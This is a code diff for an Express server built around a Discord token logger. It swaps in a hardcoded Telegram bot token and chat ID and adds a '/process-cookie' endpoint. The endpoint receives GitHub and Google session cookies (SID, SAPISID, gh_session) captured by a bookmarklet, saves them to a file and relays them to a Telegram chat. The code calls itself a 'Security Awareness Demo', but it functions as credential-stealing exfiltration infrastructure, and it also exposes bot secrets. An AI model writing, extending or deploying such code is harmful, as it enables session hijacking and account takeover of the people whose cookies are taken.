@@ -11,7 +11,7 @@ console.log('📦 Loading DiscordTokenLogger...');
 const DiscordTokenLogger = require('./discord-token-logger');
 
 const app = express();
-const PORT = process.env.PORT || 5000;
+const PORT = process.env.PORT || 6000;
 
 console.log(`🔧 Server configured for port ${PORT}`);
 
@@ -19,8 +19,8 @@ console.log(`🔧 Server configured for port ${PORT}`);
 const tokenLogger = new DiscordTokenLogger();
 
 // Telegram Bot Configuration
-let TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8438702808:AAEs_vLYyLRRlylWufwdziIrVRMaEGPMEwM';
-let TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-4981274627';
+let TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8309973450:AAHef-eYr2N2B0r4ivuNPwT7JbIGhZMZHH8';
+let TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '825587675';
 
 // Telegram messaging function
 async function sendToTelegram(message, tokenData = null) {
@@ -338,6 +338,109 @@ apiRouter.post('/test-telegram', async (req, res) => {
     res.status(500).json({
       success: false,
       message: 'Telegram test failed',
+      error: error.message
+    });
+  }
+});
+
+// Process captured cookies endpoint (GitHub/Google)
+apiRouter.post('/process-cookie', async (req, res) => {
+  try {
+    const { cookie, sid, sapisid, type, url, timestamp, method } = req.body;
+
+    if (!cookie) {
+      return res.status(400).json({
+        success: false,
+        message: 'No cookie data provided'
+      });
+    }
+
+    console.log(`🍪 Processing ${type || 'unknown'} cookie capture...`);
+    if (sid) console.log(`🔐 SID extracted: ${sid.substring(0, 50)}...`);
+    if (sapisid) console.log(`🔐 SAPISID extracted: ${sapisid.substring(0, 50)}...`);
+
+    const cookieRecord = {
+      timestamp: timestamp || new Date().toISOString(),
+      type: type || 'unknown',
+      cookie: cookie,
+      sid: sid || 'N/A',
+      sapisid: sapisid || 'N/A',
+      url: url || 'N/A',
+      method: method || 'bookmarklet',
+      source: 'Security Awareness Demo'
+    };
+
+    // Save to cookies JSON file
+    const cookiesJsonPath = path.join(__dirname, 'tokens', 'captured_cookies.json');
+    let existingCookies = [];
+    
+    if (fs.existsSync(cookiesJsonPath)) {
+      const data = fs.readFileSync(cookiesJsonPath, 'utf8');
+      existingCookies = JSON.parse(data);
+    }
+    
+    existingCookies.push(cookieRecord);
+    fs.writeFileSync(cookiesJsonPath, JSON.stringify(existingCookies, null, 2));
+    
+    console.log(`✅ ${type} cookie saved to:`, cookiesJsonPath);
+
+    // Send to Telegram
+    let telegramMsg = '';
+    if (type === 'github') {
+      telegramMsg = `🐙 GITHUB SESSION CAPTURED 🐙
+
+🔑 Cookie Data:
+${cookie.substring(0, 600)}${cookie.length > 600 ? '...' : ''}
+
+🌐 Captured From: ${url}
+⏰ Timestamp: ${new Date().toLocaleString()}
+📋 Method: ${method}
+
+⚡ Status: GitHub gh_session + user_session cookies captured successfully!`;
+    } else if (type === 'google') {
+      telegramMsg = `🔍 GOOGLE ALL COOKIES CAPTURED 🔍
+
+🔑 **CRITICAL COOKIES**:
+📌 **SID**: ${sid && sid !== 'N/A' ? sid.substring(0, 80) + '...' : 'Not found'}
+📌 **SAPISID**: ${sapisid && sapisid !== 'N/A' ? sapisid.substring(0, 80) + '...' : 'Not found'}
+
+🍪 All Cookie Data:
+${cookie.substring(0, 600)}${cookie.length > 600 ? '...' : ''}
+
+📍 Other Google Cookies Captured:
+- NID (Tracking)
+- SSID, HSID (Session IDs)
+- APISID (API Sessions)
+- __Secure-* (Secure tokens)
+- OTZ (Timezone)
+- 1P_JAR (First Party)
+
+🌐 Captured From: ${url}
+⏰ Timestamp: ${new Date().toLocaleString()}
+📋 Method: ${method}
+
+⚡ Status: All Google session cookies captured successfully!`;
+    } else {
+      telegramMsg = `🍪 COOKIES CAPTURED
+
+Type: ${type}
+Data: ${cookie.substring(0, 300)}...
+URL: ${url}`;
+    }
+
+    await sendToTelegram(telegramMsg);
+
+    res.json({
+      success: true,
+      message: `${type} cookie captured and saved`,
+      type: type
+    });
+
+  } catch (error) {
+    console.error('Error processing cookie:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Internal server error',
       error: error.message
     });
   }
